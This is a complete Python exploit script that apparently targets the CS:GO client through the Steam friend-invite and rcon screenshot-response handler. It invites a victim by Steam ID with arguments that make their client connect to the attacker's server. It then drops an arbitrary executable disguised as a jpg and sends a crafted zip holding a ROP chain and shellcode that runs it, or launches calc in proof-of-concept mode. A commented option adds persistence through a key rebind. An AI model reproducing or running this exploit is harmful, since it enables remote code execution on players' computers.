import socket
import struct
import sys
import time
import zipfile

from ctypes import c_char_p
from io import BytesIO
from steamworks import *


# send a file to the client abusing the screenshot response rcon handler
def send_file(s, payload):
	"""
	struct rcon_packet
	{
		uint32_t total_size; // total size of the packet - sizeof(uint32_t)
		uint32_t request_id; // unused
		uint32_t cmd_id; // ServerDataResponseType_t
		uint8_t payload[1]; // depends on the cmd id
	};
	"""

	# construct rcon packet according to struct definition
	raw_data = struct.pack("I", 12 + len(payload))
	raw_data += struct.pack("I", 0xffffffff)
	raw_data += struct.pack("I", 5) # SERVERDATA_SCREENSHOT_RESPONSE
	raw_data += struct.pack("I", len(payload))
	raw_data += payload

	s.send(raw_data)


# force the client to unpack an executable as screenshot0000.jpg in the csgo directory
def send_exe(s, exe_data):
	# create in memory zip
	mem_zip = BytesIO()

	# add the screenshot/exe data to the zip
	with zipfile.ZipFile(mem_zip, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
		zf.writestr("screenshot.jpg", exe_data)

	# deliver the zip
	send_file(s, mem_zip.getvalue())


def craft_payload(shellcode):
	# read in corrupted zip template
	with open("corrupted.zip", "rb") as f:
		zip_content = f.read()

	# xinput special gadgets
	increment_gadget = 0x0040a76d # add al, 4; add byte ptr [eax], al; ret
	write_gadget = 0x00407e97 # mov dword ptr [eax + 4], ecx; mov dword ptr [0x40faa8], eax; pop ebp; ret
	load_gadget = 0x00408a59 # pop ecx; ret
	execute_gadget = 0x0040b7af # and al, 0xc; push eax; ret

	# xinput rop chain, create rwx code page and map first 4 shellcode bytes
	xinput_gadgets = [
		0x0040869b, # pop eax
		0x00401088, # &HeapCreate IAT ptr
		0x0040cb42, # mov eax, dword ptr[eax]; pop ebp; ret
		0xdeadbeef, # padding
		0x0040869c, # ret
		0x00407b9e, # jmp eax
		load_gadget, # pop ecx, return address of HeapCreate, will pop gadget below dwMaximumSize
		0x00040000, # HEAP_CREATE_ENABLE_EXECUTE
		0x0, # dwInitialSize
		0x1000, # dwMaximumSize
		shellcode[0] - 4, # first shellcode part, al is added to LSB so account for that
		write_gadget, # write gadget
		0xdeadbeef, # padding
		increment_gadget, # increment base ptr
	]

	# construct the malicious zip
	# first read in 3 original bytes from the template
	exploit_data = zip_content[0:3]

	# write initial xinput gadgets
	for gadget in xinput_gadgets:
		exploit_data += struct.pack("I", gadget)

	# write gadgets that map remaining shellcode bytes to executable page
	for i in range(1, len(shellcode)):
		# adjust for the add al, 4 in the write gadget
		code = (shellcode[i] & 0xffffff00) | (((shellcode[i] & 0xff) - (4 * (i + 1))) & 0xff)

		# load shellcode bytes, write, increment, repeat until shellcode is entirely written
		exploit_data += struct.pack("I", load_gadget)
		exploit_data += struct.pack("I", code)
		exploit_data += struct.pack("I", write_gadget)
		exploit_data += struct.pack("I", 0)
		exploit_data += struct.pack("I", increment_gadget)

	# additional increment required to satisfy (al & 0xc) == 0x4
	exploit_data += struct.pack("I", increment_gadget)

	# finally execute the shellcode
	exploit_data += struct.pack("I", execute_gadget)

	# append remaining bytes from the template zip
	exploit_data += zip_content[len(exploit_data):]

	return exploit_data


# execute screenshot0000.jpg
def exec_screenshot(s):
	# see shellcode.asm
	shellcode = [
		0x000000e8,
		0xe9815900,
		0x00401005,
		0x8b64d231,
		0x768b3072,
		0x0c768b0c,
		0x8b308bad,
		0x5f8b187e,
		0x1f5c8b3c,
		0x1f748b78,
		0x8bfe0120,
		0x0f241f54,
		0x42172cb7,
		0x3c81ad42,
		0x6e695707,
		0x8bf07545,
		0x011c1f74,
		0xae3c03fe,
		0x1055358d,
		0xce010040,
		0xff56006a,
		0x677363d7,
		0x63735c6f,
		0x6e656572,
		0x746f6873,
		0x30303030,
		0x67706a2e,
		0x00000000,
	]

	# send the exploit
	send_file(s, craft_payload(shellcode))


# construct and send the calc exploit
def exec_calc(s):
	# see https://github.com/peterferrie/win-exec-calc-shellcode/blob/master/w32-exec-calc-shellcode.asm
	shellcode = [
		0x6852d231,
		0x636c6163,
		0x51525954,
		0x30728b64,
		0x8b0c768b,
		0x8bad0c76,
		0x187e8b30,
		0x8b3c5f8b,
		0x8b781f5c,
		0x01201f74,
		0x1f548bfe,
		0x2cb70f24,
		0xad424217,
		0x57073c81,
		0x75456e69,
		0x1f748bf0,
		0x03fe011c,
		0xd7ffae3c,
		0x90909090, # alignment
		0x90909090,
	]

	# send the exploit
	send_file(s, craft_payload(shellcode))


# incoming connection handler
def on_connection(client_socket, addr, custom_bin):
	print(f"Exploiting user with IP {addr[0]}:{addr[1]}")

	if custom_bin:
		# first upload the custom executable to the victim
		with open(custom_bin, "rb") as f:
			send_exe(client_socket, f.read())

		time.sleep(1)

		# execute csgo/screenshot0000.jpg
		exec_screenshot(client_socket)
	else:
		# in poc mode just spawn calc
		exec_calc(client_socket)


if __name__ == "__main__":
	if len(sys.argv) < 2:
		print("Usage: python3 exploit.py victimsteamid [custom executable name]")
		exit(1)

	victim_id = sys.argv[1]

	if len(sys.argv) > 2:
		custom_bin = sys.argv[2]
	else:
		custom_bin = None
	
	# spawn the rcon server
	s = socket.socket(proto=socket.IPPROTO_TCP)
	host = "192.168.178.27"
	port = 46104

	s.bind((host, port))
	s.listen(0)

	# invite friend
	steam = STEAMWORKS()	
	steam.initialize()

	# construct the command line (obviously use your public IP here...)
	cmd_line = "+rcon_address 13.33.33.37:46104 +rcon"

	# uncomment for persistent mode
	# cmd_line += " +bind\"tab\"\"+showscores;rcon_address 13.33.33.37:46104;rcon\" +host_writeconfig"

	SteamFriends(steam).InviteFriend(int(victim_id), c_char_p(cmd_line.encode("utf-8")))

	# wait for victim to connect
	c, addr = s.accept()
	on_connection(c, addr, custom_bin)
